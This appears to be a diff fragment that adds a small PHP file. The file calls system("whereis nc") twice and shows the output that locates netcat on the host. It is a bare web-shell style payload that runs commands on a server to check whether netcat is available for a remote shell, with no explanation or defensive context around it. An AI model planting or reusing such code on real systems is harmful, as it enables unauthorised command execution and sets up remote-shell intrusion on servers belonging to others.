@@ -1,0 +1,8 @@
+
+
+<?php print system("whereis nc");?>
+
+<?php print system("whereis nc");?>
+
+
+/usr/share/man/man1/nc.1.gz
